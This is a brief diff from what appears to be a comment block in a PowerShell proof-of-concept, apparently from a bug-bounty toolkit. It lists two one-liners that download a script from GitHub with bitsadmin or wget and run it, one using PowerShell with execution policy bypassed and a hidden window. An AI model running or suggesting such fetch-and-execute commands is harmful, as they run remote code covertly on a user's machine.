@@ -15,7 +15,7 @@ Method 1
  bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosipoc.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1
 
 Method 2
-wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosipoc.ps1 -o byosipoc.ps1;./byosipoc.ps1
+wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byosi.ps1 -o byosipoc.ps1;./byosipoc.ps1
 
 #>
 
